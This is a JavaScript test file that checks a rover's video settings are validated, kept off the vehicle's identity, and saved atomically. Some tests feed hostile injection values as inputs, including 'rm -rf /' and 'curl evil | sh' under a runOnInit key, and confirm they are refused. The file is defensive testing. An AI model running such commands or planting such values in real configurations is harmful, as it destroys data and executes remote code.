'use strict';

// Tests for operator video-parameter validation and persistence.
//
// The persistence half exists because video settings silently reverted on every
// restart. The validation half exists because persisting made the pre-existing lack of
// validation far more dangerous: `setParams()` previously assigned whatever arrived, so
// an unauthenticated socket could put a string or a NaN into the generated YAML — and
// once that is written to the per-rover overlay, it survives reboots as an encoder that
// will not start.
//
// The overlay file also holds `rover_id`, the vehicle's identity. Several tests below
// exist purely to prove a video setting can never damage it.

const test   = require('node:test');
const assert = require('node:assert/strict');

const {
  sanitizeVideoParams, overlayUpdatesFor, mergeOverlay, persistVideoParams,
  VIDEO_PARAM_SPEC,
} = require('../video-params');

// ── Validation ───────────────────────────────────────────────────────────────

test('valid parameters are accepted and coerced to integers', () => {
  const { params, rejected } = sanitizeVideoParams(
    { width: '320', height: 240, fps: 12.4, bitrate: 200 });
  assert.deepEqual(params, { width: 320, height: 240, fps: 12, bitrate: 200 });
  assert.deepEqual(rejected, []);
});

test('a value that would break the encoder is rejected, not clamped', () => {
  // Clamping would silently give the operator a setting they did not ask for, and
  // then PERSIST it. Rejecting reports the disagreement instead.
  const { params, rejected } = sanitizeVideoParams(
    { width: 0, height: -1, fps: 0, bitrate: 99999 });
  assert.deepEqual(params, {}, 'nothing invalid may be applied');
  assert.equal(rejected.length, 4);
  for (const field of ['width', 'height', 'fps', 'bitrate']) {
    assert.ok(rejected.some((m) => m.startsWith(field)), `${field} must be reported`);
  }
});

test('non-numeric and structural garbage is rejected', () => {
  // These are exactly what an unauthenticated caller sends. Each used to be assigned
  // straight into the YAML.
  for (const bad of ['fast', null, {}, [], true, NaN, Infinity, undefined]) {
    const { params } = sanitizeVideoParams({ fps: bad });
    assert.deepEqual(params, {}, `fps=${JSON.stringify(bad) ?? 'undefined'} must be refused`);
  }
});

test('unknown keys are refused, so only whitelisted settings can ever be written', () => {
  const { params, rejected } = sanitizeVideoParams(
    { width: 640, rpiCameraExtraArgs: '; rm -rf /', __proto__: 'x', runOnInit: 'curl evil' });
  assert.deepEqual(params, { width: 640 });
  assert.ok(rejected.some((m) => m.includes('rpiCameraExtraArgs')));
  assert.ok(rejected.some((m) => m.includes('runOnInit')),
    'an unrecognised key must be reported, not ignored — this is the YAML injection surface');
});

test('a non-object request is refused outright', () => {
  for (const bad of [null, undefined, 'width=640', 42, []]) {
    const { params, rejected } = sanitizeVideoParams(bad);
    assert.deepEqual(params, {});
    assert.equal(rejected.length, 1, `${JSON.stringify(bad) ?? 'undefined'} must be reported once`);
  }
});

test('every spec bound is inclusive at both ends', () => {
  // Off-by-one at a boundary would reject a legitimate setting, which reads to the
  // operator as "the UI does not work" — the complaint this whole change answers.
  for (const [name, spec] of Object.entries(VIDEO_PARAM_SPEC)) {
    for (const edge of [spec.min, spec.max]) {
      const { params } = sanitizeVideoParams({ [name]: edge });
      assert.equal(params[name], edge, `${name}=${edge} is in range and must be accepted`);
    }
    for (const outside of [spec.min - 1, spec.max + 1]) {
      const { params } = sanitizeVideoParams({ [name]: outside });
      assert.equal(params[name], undefined, `${name}=${outside} is out of range`);
    }
  }
});

// ── Codec mapping ────────────────────────────────────────────────────────────

test('params map to the tracked config keys the driver actually reads', () => {
  const { updates, unsupported } = overlayUpdatesFor('webrtc',
    { width: 320, height: 240, fps: 12, bitrate: 200 });
  assert.equal(unsupported, false);
  assert.deepEqual(updates, {
    webrtc_width: 320, webrtc_height: 240, webrtc_fps: 12, webrtc_bitrate_kbps: 200,
  });
  // Note the name: bitrate -> webrtc_bitrate_kbps, not webrtc_bitrate. Writing a key
  // the driver never reads would persist silently and change nothing.
  assert.ok('webrtc_bitrate_kbps' in updates);
});

test('h264 maps to its own keys, including the differently-named framerate', () => {
  const { updates } = overlayUpdatesFor('h264', { width: 640, fps: 30, bitrate: 600 });
  assert.deepEqual(updates,
    { h264_width: 640, h264_framerate: 30, h264_bitrate_kbps: 600 });
});

test('an unknown codec reports unsupported rather than persisting nothing quietly', () => {
  const { updates, unsupported } = overlayUpdatesFor('av1', { width: 640 });
  assert.equal(unsupported, true);
  assert.deepEqual(updates, {});
});

// ── Merging must never damage rover identity ─────────────────────────────────

test('merging preserves every key it does not own, including rover_id', () => {
  const existing = { rover_id: 3, battery_empty_volts: 6.0, _comment: 'keep me' };
  const merged = mergeOverlay(existing, { webrtc_width: 320 });
  assert.equal(merged.rover_id, 3,
    'clobbering rover_id would make the vehicle report as a different rover');
  assert.equal(merged.battery_empty_volts, 6.0);
  assert.equal(merged._comment, 'keep me');
  assert.equal(merged.webrtc_width, 320);
});

test('merging does not mutate the object it was given', () => {
  const existing = { rover_id: 3 };
  mergeOverlay(existing, { webrtc_width: 320 });
  assert.deepEqual(existing, { rover_id: 3 }, 'the caller\'s config object must be untouched');
});

// ── Persistence ──────────────────────────────────────────────────────────────

// A fake fs that records writes and can be told to fail, so every branch below is
// exercised against the real persistVideoParams rather than a reimplementation.
function fakeFs({ readResult = null, readError = null, failWrite = false, failRename = false } = {}) {
  const calls = { writes: [], renames: [], unlinks: [] };
  return {
    calls,
    promises: {
      async readFile() { if (readError) throw readError; return readResult; },
      async writeFile(p, data) {
        if (failWrite) throw new Error('ENOSPC');
        calls.writes.push([p, data]);
      },
      async rename(from, to) {
        if (failRename) throw new Error('EXDEV');
        calls.renames.push([from, to]);
      },
      async unlink(p) { calls.unlinks.push(p); },
    },
  };
}

test('a successful persist writes a temp file and renames it into place', async () => {
  // Atomic on purpose: this file holds rover_id and is parsed at startup, so a torn
  // write would leave the rover unable to load its own identity — over a video setting.
  const fs = fakeFs({ readResult: JSON.stringify({ rover_id: 3 }) });
  const r = await persistVideoParams({
    overlayPath: '/opt/picar/picar-cfg.local.json', codec: 'webrtc',
    params: { width: 320, bitrate: 200 }, fs,
  });
  assert.equal(r.persisted, true, r.reason);
  assert.equal(fs.calls.writes.length, 1);
  assert.equal(fs.calls.renames.length, 1);
  const [tmpPath, data] = fs.calls.writes[0];
  assert.notEqual(tmpPath, '/opt/picar/picar-cfg.local.json',
    'the real file must never be written directly');
  assert.equal(fs.calls.renames[0][1], '/opt/picar/picar-cfg.local.json');
  const written = JSON.parse(data);
  assert.equal(written.rover_id, 3, 'rover_id survived');
  assert.equal(written.webrtc_width, 320);
  assert.equal(written.webrtc_bitrate_kbps, 200);
});

test('a missing overlay is created; a CORRUPT one is never overwritten', async () => {
  const enoent = Object.assign(new Error('no such file'), { code: 'ENOENT' });
  const fresh = fakeFs({ readError: enoent });
  const ok = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: fresh });
  assert.equal(ok.persisted, true, 'a fresh rover has no overlay yet; that is normal');

  // Unparseable content means we cannot know what rover_id was. Overwriting would
  // destroy it, so refuse and say why.
  const corrupt = fakeFs({ readResult: '{ this is not json' });
  const bad = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: corrupt });
  assert.equal(bad.persisted, false);
  assert.match(bad.reason, /unreadable overlay/);
  assert.equal(corrupt.calls.writes.length, 0, 'nothing may be written over a corrupt overlay');

  // A JSON array parses fine but is not a config object.
  const arr = fakeFs({ readResult: '[1,2,3]' });
  const arrRes = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: arr });
  assert.equal(arrRes.persisted, false);
  assert.equal(arr.calls.writes.length, 0);
});

test('an unreadable overlay for any reason other than ENOENT is refused', async () => {
  const eacces = Object.assign(new Error('permission denied'), { code: 'EACCES' });
  const fs = fakeFs({ readError: eacces });
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs });
  assert.equal(r.persisted, false, 'EACCES must not be treated like a missing file');
  assert.equal(fs.calls.writes.length, 0);
});

test('a failed write or rename reports failure and cleans up the temp file', async () => {
  const w = fakeFs({ readResult: '{}', failWrite: true });
  const wr = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: w });
  assert.equal(wr.persisted, false);
  assert.match(wr.reason, /write failed/);
  assert.equal(w.calls.unlinks.length, 1, 'a partial temp file must not be left behind');

  const r = fakeFs({ readResult: '{}', failRename: true });
  const rr = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: r });
  assert.equal(rr.persisted, false);
  assert.equal(r.calls.unlinks.length, 1);
});

test('nothing persistable means an explicit no, not a false success', async () => {
  const fs = fakeFs({ readResult: '{}' });
  // mjpeg has no width/height keys in the tracked config.
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'mjpeg', params: { width: 320 }, fs });
  assert.equal(r.persisted, false);
  assert.equal(fs.calls.writes.length, 0);

  const none = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: {}, fs });
  assert.equal(none.persisted, false);
  assert.match(none.reason, /nothing to persist/);
});

test('only whitelisted keys can reach the overlay, even via persistVideoParams', async () => {
  // Defence in depth: sanitize runs in the driver, but persistence must not depend on
  // its caller having done so. An injected key must not be writable through this path.
  const fs = fakeFs({ readResult: JSON.stringify({ rover_id: 3 }) });
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc',
    params: { width: 320, runOnInit: 'curl evil | sh', pwm_method: 'libgpiod' }, fs });
  assert.equal(r.persisted, true);
  const written = JSON.parse(fs.calls.writes[0][1]);
  assert.deepEqual(Object.keys(written).sort(), ['rover_id', 'webrtc_width'],
    'no key outside the codec mapping may be persisted');
});

// ── The DRIVER must validate, not merely be able to ──────────────────────────

test('setParams refuses garbage at the driver, not just in the helper', () => {
  // Surviving mutation before this test existed:
  //     const clean = newParams; const rejected = [];
  // i.e. the sanitizer imported, called nowhere. Every test above still passed,
  // because they all exercise video-params.js directly. This is the branch's
  // recurring defect shape — a correct rule with an untouched consumer — and it is
  // the one that matters most here, since the consumer is the unauthenticated
  // setVideoParams path that writes the YAML.
  const os   = require('os');
  const fs   = require('fs');
  const path = require('path');
  const makeWebrtc = require('../streams/webrtc.js');

  const yml = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'picar-vp-')), 'mediamtx.yml');
  const stream = makeWebrtc({
    mediamtx_yml: yml,
    webrtc_width: 480, webrtc_height: 360, webrtc_fps: 20, webrtc_bitrate_kbps: 350,
    // `true` exits 0 immediately: exercises the real restart path without touching
    // a service on the machine running the tests.
    mediamtx_restart_cmd: ['true'],
  });
  try {
    const before = { ...stream.getStreamConfig() };

    const bad = stream.setParams({ fps: 'fast', width: 0, runOnInit: 'curl evil | sh' });
    assert.deepEqual(bad.applied, {}, 'no invalid value may be applied');
    assert.ok(bad.rejected.length >= 3, `all three must be reported: ${JSON.stringify(bad.rejected)}`);
    assert.deepEqual(stream.getStreamConfig(), before,
      'the effective config must be unchanged after a fully-invalid request');
    const ymlText = fs.readFileSync(yml, 'utf8');
    assert.ok(!ymlText.includes('curl evil'),
      'an unwhitelisted key reached the generated YAML — this is the injection surface');
    assert.ok(!/rpiCameraFPS: fast/.test(ymlText), ymlText.slice(0, 200));

    // And a valid request must still work, or "it validates" would be satisfied by
    // a setter that refuses everything.
    const ok = stream.setParams({ width: 320, height: 240, fps: 12, bitrate: 200 });
    assert.deepEqual(ok.applied, { width: 320, height: 240, fps: 12, bitrate: 200 });
    const cfg = stream.getStreamConfig();
    assert.equal(cfg.width, 320);
    assert.equal(cfg.bitrate, 200);
    assert.match(fs.readFileSync(yml, 'utf8'), /rpiCameraBitrate: 200000/);
  } finally {
    if (typeof stream.stop === 'function') stream.stop();
  }
});

test('a partially valid request applies the good values and reports the bad', () => {
  const os   = require('os');
  const fs   = require('fs');
  const path = require('path');
  const makeWebrtc = require('../streams/webrtc.js');
  const yml = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'picar-vp-')), 'mediamtx.yml');
  const stream = makeWebrtc({ mediamtx_yml: yml, mediamtx_restart_cmd: ['true'] });
  try {
    const r = stream.setParams({ width: 320, fps: 999 });
    assert.equal(r.applied.width, 320, 'the valid half must still take effect');
    assert.equal(r.applied.fps, undefined);
    assert.ok(r.rejected.some((m) => m.startsWith('fps')));
    assert.equal(stream.getStreamConfig().fps, 20, 'fps must hold its previous value');
  } finally {
    if (typeof stream.stop === 'function') stream.stop();
  }
});
